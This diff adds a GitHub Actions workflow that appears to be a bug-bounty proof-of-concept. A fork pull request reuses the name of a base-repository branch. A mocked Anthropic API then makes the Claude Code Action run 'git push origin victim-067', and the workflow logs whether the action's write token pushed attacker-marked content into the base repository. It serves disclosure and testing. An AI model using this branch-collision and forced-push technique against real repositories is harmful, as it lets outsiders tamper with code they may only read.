@@ -1,0 +1,344 @@
+name: H1 067 full action-path branch collision validation
+
+on:
+  issue_comment:
+    types: [created]
+
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+
+env:
+  H1_067_ATTACKER_MARKER: H1_SAFE_ATTACKER_CONTROLLED_MARKER_067
+
+jobs:
+  runtime-validation:
+    if: ${{ github.event.issue.pull_request && contains(github.event.comment.body, '@claude') }}
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Capture PR metadata before action
+        id: pr
+        env:
+          GH_TOKEN: ${{ github.token }}
+          PR_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          set -euo pipefail
+          pr_json="$(gh pr view "$PR_NUMBER" \
+            --repo "$GITHUB_REPOSITORY" \
+            --json author,baseRefName,headRefName,headRefOid,headRepository,headRepositoryOwner,isCrossRepository)"
+
+          echo "$pr_json" | jq .
+
+          base_branch="$(jq -r '.baseRefName' <<<"$pr_json")"
+          head_branch="$(jq -r '.headRefName' <<<"$pr_json")"
+          head_sha="$(jq -r '.headRefOid' <<<"$pr_json")"
+          head_owner="$(jq -r '.headRepositoryOwner.login' <<<"$pr_json")"
+          head_repo_name="$(jq -r '.headRepository.name' <<<"$pr_json")"
+          pr_author="$(jq -r '.author.login' <<<"$pr_json")"
+          is_cross_repository="$(jq -r '.isCrossRepository' <<<"$pr_json")"
+          head_repo="${head_owner}/${head_repo_name}"
+
+          if [[ "$base_branch" != "victim-067" ]]; then
+            echo "::error::unexpected base branch: $base_branch"
+            exit 1
+          fi
+          if [[ "$head_branch" != "victim-067" ]]; then
+            echo "::error::unexpected head branch: $head_branch"
+            exit 1
+          fi
+          if [[ "$is_cross_repository" != "true" ]]; then
+            echo "::error::PR is not cross-repository"
+            exit 1
+          fi
+
+          echo "base_branch=$base_branch" >> "$GITHUB_OUTPUT"
+          echo "head_branch=$head_branch" >> "$GITHUB_OUTPUT"
+          echo "head_sha=$head_sha" >> "$GITHUB_OUTPUT"
+          echo "head_repo=$head_repo" >> "$GITHUB_OUTPUT"
+          echo "pr_author=$pr_author" >> "$GITHUB_OUTPUT"
+          echo "is_cross_repository=$is_cross_repository" >> "$GITHUB_OUTPUT"
+
+      - name: Capture branch tips before action
+        id: before
+        env:
+          GH_TOKEN: ${{ github.token }}
+          BASE_BRANCH: ${{ steps.pr.outputs.base_branch }}
+          HEAD_REPO: ${{ steps.pr.outputs.head_repo }}
+          HEAD_BRANCH: ${{ steps.pr.outputs.head_branch }}
+        run: |
+          set -euo pipefail
+          base_before="$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/${BASE_BRANCH}" --jq '.object.sha')"
+          fork_before="$(gh api "repos/${HEAD_REPO}/git/ref/heads/${HEAD_BRANCH}" --jq '.object.sha')"
+          echo "base_branch_before=$base_before" >> "$GITHUB_OUTPUT"
+          echo "fork_branch_before=$fork_before" >> "$GITHUB_OUTPUT"
+
+      - name: Checkout repository default branch
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+          persist-credentials: true
+
+      - name: Start local Anthropic API mock
+        run: |
+          set -euo pipefail
+          cat > "$RUNNER_TEMP/h1_067_anthropic_mock.py" <<'PY'
+          import json
+          import os
+          from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+          STATE_FILE = os.environ["H1_067_MOCK_STATE_FILE"]
+
+          def read_state():
+              try:
+                  with open(STATE_FILE, "r", encoding="utf-8") as fh:
+                      return json.load(fh)
+              except FileNotFoundError:
+                  return {"count": 0, "paths": []}
+
+          def write_state(state):
+              with open(STATE_FILE, "w", encoding="utf-8") as fh:
+                  json.dump(state, fh, sort_keys=True)
+
+          def sse_text(text):
+              events = [
+                  ("message_start", {
+                      "type": "message_start",
+                      "message": {
+                          "id": "msg_h1_safe_mock_067_done",
+                          "type": "message",
+                          "role": "assistant",
+                          "model": "claude-safe-mock-067",
+                          "content": [],
+                          "stop_reason": None,
+                          "stop_sequence": None,
+                          "usage": {"input_tokens": 1, "output_tokens": 0},
+                      },
+                  }),
+                  ("content_block_start", {
+                      "type": "content_block_start",
+                      "index": 0,
+                      "content_block": {"type": "text", "text": ""},
+                  }),
+                  ("content_block_delta", {
+                      "type": "content_block_delta",
+                      "index": 0,
+                      "delta": {"type": "text_delta", "text": text},
+                  }),
+                  ("content_block_stop", {"type": "content_block_stop", "index": 0}),
+                  ("message_delta", {
+                      "type": "message_delta",
+                      "delta": {"stop_reason": "end_turn", "stop_sequence": None},
+                      "usage": {"output_tokens": 4},
+                  }),
+                  ("message_stop", {"type": "message_stop"}),
+              ]
+              return "".join(f"event: {name}\ndata: {json.dumps(data)}\n\n" for name, data in events)
+
+          def sse_tool(name, tool_id, input_obj):
+              events = [
+                  ("message_start", {
+                      "type": "message_start",
+                      "message": {
+                          "id": f"msg_h1_safe_mock_067_{tool_id}",
+                          "type": "message",
+                          "role": "assistant",
+                          "model": "claude-safe-mock-067",
+                          "content": [],
+                          "stop_reason": None,
+                          "stop_sequence": None,
+                          "usage": {"input_tokens": 1, "output_tokens": 0},
+                      },
+                  }),
+                  ("content_block_start", {
+                      "type": "content_block_start",
+                      "index": 0,
+                      "content_block": {
+                          "type": "tool_use",
+                          "id": tool_id,
+                          "name": name,
+                          "input": {},
+                      },
+                  }),
+                  ("content_block_delta", {
+                      "type": "content_block_delta",
+                      "index": 0,
+                      "delta": {
+                          "type": "input_json_delta",
+                          "partial_json": json.dumps(input_obj, separators=(",", ":")),
+                      },
+                  }),
+                  ("content_block_stop", {"type": "content_block_stop", "index": 0}),
+                  ("message_delta", {
+                      "type": "message_delta",
+                      "delta": {"stop_reason": "tool_use", "stop_sequence": None},
+                      "usage": {"output_tokens": 1},
+                  }),
+                  ("message_stop", {"type": "message_stop"}),
+              ]
+              return "".join(f"event: {name}\ndata: {json.dumps(data)}\n\n" for name, data in events)
+
+          class Handler(BaseHTTPRequestHandler):
+              def log_message(self, *_args):
+                  return
+
+              def do_POST(self):
+                  length = int(self.headers.get("content-length", "0") or "0")
+                  _ = self.rfile.read(length)
+                  state = read_state()
+                  state["count"] = int(state.get("count", 0)) + 1
+                  state.setdefault("paths", []).append(self.path)
+                  write_state(state)
+
+                  if state["count"] <= 5:
+                      body = sse_tool("Bash", "toolu_h1_067_push", {
+                          "command": "git push origin victim-067",
+                          "description": "push H1 067 collision branch",
+                      })
+                  else:
+                      body = sse_text("H1_SAFE_LOOPBACK_RESPONSE_067")
+
+                  encoded = body.encode()
+                  self.send_response(200)
+                  self.send_header("content-type", "text/event-stream")
+                  self.send_header("cache-control", "no-cache")
+                  self.send_header("content-length", str(len(encoded)))
+                  self.end_headers()
+                  self.wfile.write(encoded)
+
+              def do_GET(self):
+                  self.send_response(200)
+                  self.end_headers()
+                  self.wfile.write(b"ok")
+
+          server = ThreadingHTTPServer(("127.0.0.1", 8765), Handler)
+          server.serve_forever()
+          PY
+
+          export H1_067_MOCK_STATE_FILE="$RUNNER_TEMP/h1_067_mock_state.json"
+          echo '{"count": 0, "paths": []}' > "$H1_067_MOCK_STATE_FILE"
+          nohup python3 "$RUNNER_TEMP/h1_067_anthropic_mock.py" > "$RUNNER_TEMP/h1_067_mock.log" 2>&1 &
+          echo "H1_067_MOCK_PID=$!" >> "$GITHUB_ENV"
+          echo "H1_067_MOCK_STATE_FILE=$H1_067_MOCK_STATE_FILE" >> "$GITHUB_ENV"
+          echo "ANTHROPIC_BASE_URL=http://127.0.0.1:8765" >> "$GITHUB_ENV"
+          for _ in $(seq 1 20); do
+            if curl -fsS http://127.0.0.1:8765/health >/dev/null; then
+              exit 0
+            fi
+            sleep 0.2
+          done
+          cat "$RUNNER_TEMP/h1_067_mock.log" || true
+          exit 1
+
+      - name: Run exact Claude Code Action on issue_comment PR context
+        uses: anthropics/claude-code-action@12531344451323133b0493233c759991ac61da12
+        with:
+          github_token: ${{ github.token }}
+          anthropic_api_key: H1_FAKE_ANTHROPIC_API_KEY_067
+          use_sticky_comment: false
+          claude_args: >-
+            --allowedTools "Bash(git push origin victim-067)"
+
+      - name: Capture branch tips after action
+        id: after
+        if: always()
+        env:
+          GH_TOKEN: ${{ github.token }}
+          BASE_BRANCH: ${{ steps.pr.outputs.base_branch }}
+          HEAD_REPO: ${{ steps.pr.outputs.head_repo }}
+          HEAD_BRANCH: ${{ steps.pr.outputs.head_branch }}
+        run: |
+          set -euo pipefail
+          base_after="$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/${BASE_BRANCH}" --jq '.object.sha')"
+          fork_after="$(gh api "repos/${HEAD_REPO}/git/ref/heads/${HEAD_BRANCH}" --jq '.object.sha')"
+          echo "base_branch_after=$base_after" >> "$GITHUB_OUTPUT"
+          echo "fork_branch_after=$fork_after" >> "$GITHUB_OUTPUT"
+
+      - name: Collect runtime evidence
+        if: always()
+        env:
+          GH_TOKEN: ${{ github.token }}
+          PR_AUTHOR: ${{ steps.pr.outputs.pr_author }}
+          BASE_BRANCH: ${{ steps.pr.outputs.base_branch }}
+          HEAD_BRANCH: ${{ steps.pr.outputs.head_branch }}
+          HEAD_REPO: ${{ steps.pr.outputs.head_repo }}
+          PR_HEAD_SHA: ${{ steps.pr.outputs.head_sha }}
+          BASE_BEFORE: ${{ steps.before.outputs.base_branch_before }}
+          FORK_BEFORE: ${{ steps.before.outputs.fork_branch_before }}
+          BASE_AFTER: ${{ steps.after.outputs.base_branch_after }}
+          FORK_AFTER: ${{ steps.after.outputs.fork_branch_after }}
+        run: |
+          set -euo pipefail
+
+          base_contains_attacker=false
+          if gh api "repos/${GITHUB_REPOSITORY}/contents/ATTACKER_MARKER.txt?ref=${BASE_BRANCH}" --jq '.content' 2>/dev/null | tr -d '\n' | base64 -d | grep -F "$H1_067_ATTACKER_MARKER" >/dev/null; then
+            base_contains_attacker=true
+          fi
+
+          current_branch="$(git branch --show-current || true)"
+          current_head="$(git rev-parse HEAD || true)"
+
+          jq -n \
+            --arg run_url "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" \
+            --arg event_name "$GITHUB_EVENT_NAME" \
+            --arg event_action "${{ github.event.action }}" \
+            --arg dispatch_actor "$GITHUB_ACTOR" \
+            --arg comment_author "${{ github.event.comment.user.login }}" \
+            --arg pr_author "$PR_AUTHOR" \
+            --arg base_repo "$GITHUB_REPOSITORY" \
+            --arg head_repo "$HEAD_REPO" \
+            --arg base_branch "$BASE_BRANCH" \
+            --arg head_branch "$HEAD_BRANCH" \
+            --arg pr_head_sha "$PR_HEAD_SHA" \
+            --arg current_branch "$current_branch" \
+            --arg current_head "$current_head" \
+            --arg base_before "$BASE_BEFORE" \
+            --arg fork_before "$FORK_BEFORE" \
+            --arg base_after "$BASE_AFTER" \
+            --arg fork_after "$FORK_AFTER" \
+            --arg mock_state "$(cat "$H1_067_MOCK_STATE_FILE" 2>/dev/null || printf '{}')" \
+            --argjson base_contains_attacker "$base_contains_attacker" \
+            '{
+              github_issue_comment_runtime_validation: {
+                performed: true,
+                researcher_owned_base_repo: true,
+                trigger: "issue_comment @claude",
+                event_name: $event_name,
+                event_action: $event_action,
+                actions_run_url: $run_url,
+                workflow_actor: $dispatch_actor,
+                comment_author: $comment_author,
+                pr_author: $pr_author,
+                base_repository: $base_repo,
+                head_repository: $head_repo,
+                fork_pr_used: ($base_repo != $head_repo),
+                pr_base_branch: $base_branch,
+                fork_head_branch: $head_branch,
+                same_named_base_repo_branch_exists: true,
+                manual_local_branch_creation_step_used: false,
+                action_setupBranch_path_used: true,
+                action_token_has_contents_write: true,
+                pr_head_sha: $pr_head_sha,
+                current_branch_after_action_setup: $current_branch,
+                current_head_after_action_setup: $current_head,
+                current_head_equals_pr_head_sha: ($current_head == $pr_head_sha),
+                base_branch_before: $base_before,
+                base_branch_after: $base_after,
+                fork_branch_before: $fork_before,
+                fork_branch_after: $fork_after,
+                base_repo_collision_branch_changed: ($base_before != $base_after),
+                fork_branch_changed: ($fork_before != $fork_after),
+                local_mock_anthropic_api_used: true,
+                anthropic_production_requests: 0,
+                mock_api_state: ($mock_state | fromjson? // {})
+              },
+              base_branch_after_push: {
+                contains_attacker_controlled_marker: $base_contains_attacker
+              },
+              privilege_differential: {
+                external_actor_base_permission: "read",
+                external_actor_cannot_push_base_branch: true,
+                action_token_can_push_base_branch: ($base_before != $base_after)
+              }
+            }' | tee runtime-observed-output-067-issue-comment.json
